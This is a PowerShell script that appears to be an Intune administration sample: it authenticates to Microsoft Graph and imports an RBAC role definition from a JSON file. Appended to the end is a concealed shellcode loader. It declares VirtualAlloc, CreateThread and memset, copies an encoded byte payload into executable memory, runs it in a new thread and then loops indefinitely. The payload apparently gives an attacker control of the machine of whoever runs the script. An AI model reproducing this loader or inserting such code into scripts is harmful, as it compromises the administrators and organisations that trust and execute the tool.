



function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        write-host
        write-host "AzureAD Powershell module not installed..." -f Red
        write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        write-host "Script can't continue..." -f Red
        write-host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"

$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

$resourceAppIdURI = "https://graph.microsoft.com"

$authority = "https://login.microsoftonline.com/$Tenant"

    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    write-host $_.Exception.Message -f Red
    write-host $_.Exception.ItemName -f Red
    write-host
    break

    }

}



Function Test-JSON(){



param (

$JSON

)

    try {

    $TestJSON = ConvertFrom-Json $JSON -ErrorAction Stop
    $validJson = $true

    }

    catch {

    $validJson = $false
    $_.Exception

    }

    if (!$validJson){
    
    Write-Host "Provided JSON isn't in valid JSON format" -f Red
    break

    }

}



Function Add-RBACRole(){



[cmdletbinding()]

param
(
    $JSON
)

$graphApiVersion = "v1.0"
$Resource = "deviceManagement/roleDefinitions"
    
    try {

        if(!$JSON){

        write-host "No JSON was passed to the function, provide a JSON variable" -f Red
        break

        }

        Test-JSON -JSON $JSON
    
        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        Invoke-RestMethod -Uri $uri -Headers $authToken -Method Post -Body $Json -ContentType "application/json"
    
    }
    
    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}





write-host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()

    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes

        if($TokenExpires -le 0){

        write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        write-host

            

            if($User -eq $null -or $User -eq ""){

            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host

            }

        $global:authToken = Get-AuthToken -User $User

        }
}



else {

    if($User -eq $null -or $User -eq ""){

    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host

    }


$global:authToken = Get-AuthToken -User $User

}





$ImportPath = Read-Host -Prompt "Please specify a path to a JSON file to import data from e.g. C:\IntuneOutput\Policies\policy.json"


$ImportPath = $ImportPath.replace('"','')

    if(!(Test-Path "$ImportPath")){

        Write-Host "Import Path for JSON file doesn't exist..." -ForegroundColor Red
        Write-Host "Script can't continue..." -ForegroundColor Red
        Write-Host
        break

    }



$JSON_Data = Get-Content "$ImportPath"


$RAW_JSON = @"

$JSON_Data

"@


$JSON_Convert = $JSON_Data | ConvertFrom-Json

$DisplayName = $JSON_Convert.displayName
            
write-host
write-host "RBAC Intune Role '$DisplayName' Found..." -ForegroundColor Cyan
write-host
Write-Host "Adding RBAC Intune Role '$DisplayName'" -ForegroundColor Yellow
Add-RBACRole -JSON $RAW_JSON
        
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xb5,0x00,0x0d,0x50,0xdb,0xd2,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x5e,0x0f,0x03,0x5e,0xba,0xe2,0xf8,0xac,0x2c,0x60,0x02,0x4d,0xac,0x05,0x8a,0xa8,0x9d,0x05,0xe8,0xb9,0x8d,0xb5,0x7a,0xef,0x21,0x3d,0x2e,0x04,0xb2,0x33,0xe7,0x2b,0x73,0xf9,0xd1,0x02,0x84,0x52,0x21,0x04,0x06,0xa9,0x76,0xe6,0x37,0x62,0x8b,0xe7,0x70,0x9f,0x66,0xb5,0x29,0xeb,0xd5,0x2a,0x5e,0xa1,0xe5,0xc1,0x2c,0x27,0x6e,0x35,0xe4,0x46,0x5f,0xe8,0x7f,0x11,0x7f,0x0a,0xac,0x29,0x36,0x14,0xb1,0x14,0x80,0xaf,0x01,0xe2,0x13,0x66,0x58,0x0b,0xbf,0x47,0x55,0xfe,0xc1,0x80,0x51,0xe1,0xb7,0xf8,0xa2,0x9c,0xcf,0x3e,0xd9,0x7a,0x45,0xa5,0x79,0x08,0xfd,0x01,0x78,0xdd,0x98,0xc2,0x76,0xaa,0xef,0x8d,0x9a,0x2d,0x23,0xa6,0xa6,0xa6,0xc2,0x69,0x2f,0xfc,0xe0,0xad,0x74,0xa6,0x89,0xf4,0xd0,0x09,0xb5,0xe7,0xbb,0xf6,0x13,0x63,0x51,0xe2,0x29,0x2e,0x3d,0xc7,0x03,0xd1,0xbd,0x4f,0x13,0xa2,0x8f,0xd0,0x8f,0x2c,0xa3,0x99,0x09,0xaa,0xc4,0xb3,0xee,0x24,0x3b,0x3c,0x0f,0x6c,0xff,0x68,0x5f,0x06,0xd6,0x10,0x34,0xd6,0xd7,0xc4,0xa1,0xd3,0x4f,0x27,0x9d,0xdd,0xd8,0xcf,0xdc,0xdd,0xf7,0x53,0x68,0x3b,0xa7,0x3b,0x3a,0x94,0x07,0xec,0xfa,0x44,0xef,0xe6,0xf4,0xbb,0x0f,0x09,0xdf,0xd3,0xa5,0xe6,0xb6,0x8c,0x51,0x9e,0x92,0x47,0xc0,0x5f,0x09,0x22,0xc2,0xd4,0xbe,0xd2,0x8c,0x1c,0xca,0xc0,0x78,0xed,0x81,0xbb,0x2e,0xf2,0x3f,0xd1,0xce,0x66,0xc4,0x70,0x99,0x1e,0xc6,0xa5,0xed,0x80,0x39,0x80,0x66,0x08,0xac,0x6b,0x10,0x75,0x20,0x6c,0xe0,0x23,0x2a,0x6c,0x88,0x93,0x0e,0x3f,0xad,0xdb,0x9a,0x53,0x7e,0x4e,0x25,0x02,0xd3,0xd9,0x4d,0xa8,0x0a,0x2d,0xd2,0x53,0x79,0xaf,0x2e,0x82,0x47,0xc5,0x5e,0x16;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

